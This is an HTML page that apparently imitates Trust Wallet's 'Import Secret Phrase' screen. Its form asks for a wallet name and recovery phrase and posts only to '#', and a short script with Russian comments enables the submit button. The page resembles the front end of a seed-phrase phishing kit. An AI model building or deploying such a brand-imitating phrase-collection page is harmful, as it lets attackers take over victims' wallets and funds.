<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css" type="text/css">
    <link rel="stylesheet" href="import-secret-phrase.css" type="text/css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&family=Wix+Madefor+Text:ital,wght@0,400..800;1,400..800&display=swap" rel="stylesheet">

    <title>Trust Wallet</title>
</head>
<body>
    <div class="wrapper">
        <div class="header">
            <h1 class="h1_text_sph">Wallet</h1>
        </div>
        <div class="wallet_enter">
            <form action="#" method="post">
                <h3 class="sph_title1">Wallet name</h3>
                <input class="sph_input1" type="text" placeholder="" required value="Main wallet">
                <h3 class="sph_title2">Import Secret Phrase</h3>
                <textarea class="sph_input" placeholder="" required></textarea>
                <input class="sph_submit" type="submit" value="Restore Wallet">
            </form>
        </div>
    </div>
    <script>
    const textarea = document.querySelector('.sph_input');
    const submitButton = document.querySelector('.sph_submit');

    textarea.addEventListener('input', () => {
      if (textarea.value.trim() !== '') {
        submitButton.classList.add('active');
        submitButton.disabled = false; //  Делаем кнопку доступной для нажатия
      } else {
        submitButton.classList.remove('active');
        submitButton.disabled = true; //  Делаем кнопку недоступной для нажатия
      }
    });
      </script>
</body>
</html>
